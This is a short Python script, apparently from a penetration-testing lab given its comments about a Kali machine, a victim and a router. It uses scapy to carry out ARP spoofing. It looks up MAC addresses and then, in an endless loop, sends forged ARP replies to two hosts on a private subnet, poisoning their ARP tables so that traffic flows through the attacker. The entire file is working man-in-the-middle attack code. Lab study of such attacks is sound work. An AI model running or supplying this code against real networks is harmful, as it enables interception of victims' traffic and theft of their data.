import time

import scapy.all as scapy
from scapy.layers.l2 import *

def main():
    packets_sent = 0;
    while True:
        spoof(pdst="172.16.149.129", psrc="172.16.149.2")
        spoof(pdst="172.16.149.2", psrc="172.16.149.129")
        packets_sent += 2
        print(f"[+] Sent {packets_sent} packets")
        time.sleep(2)


def get_mac(ip):
    # create an arp request directed to broadcast MAC asking for IP
    # Part 1 - ask who has the target IP
    arp_request = ARP(pdst=ip)
    #arp_request.show()
    # print(arp_request.summary())
    # Part 2 - set destination MAC to Broadcast MAC; involves combining frames to broadcast
    # packets.  Involes creating a frame
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()
    scapy.ls(scapy.Ether())
    # print(broadcast.summary())
    # create the frame
    arp_request_broadcast = broadcast / arp_request
    # print(arp_request_broadcast.summary())
    #arp_request_broadcast.show()
    # send packet and capture response
    # return data as a list of dictionaries
    clients_lists = []
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    for element in answered_list:
        clients_lists.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
        # print(f"{element[1].psrc}\t\t{element[1].hwsrc}")
    # print(clients_lists[0]["mac"])
    return clients_lists[0]["mac"]

def spoof(pdst, psrc):
    target_mac = get_mac(pdst)
    # set the target machine - ip and mac address
    # set the source field as the router
    # sends a packet to the victim, saying I have the routers address
    # this associates the ip address of the router with the MAC address of the kali machine
    # in the ARP table of the target
    packet = scapy.ARP(op=2, pdst=pdst, hwdst=target_mac, psrc=psrc)
    # print(f"packet.show(): {packet.show()}")
    # print(f"packet.summary(): {packet.summary()}")
    # send the packet and poison the table
    # this will change the MAC address associated with the psrc address
    scapy.send(packet, verbose=False)







if __name__ == "__main__":
    main()

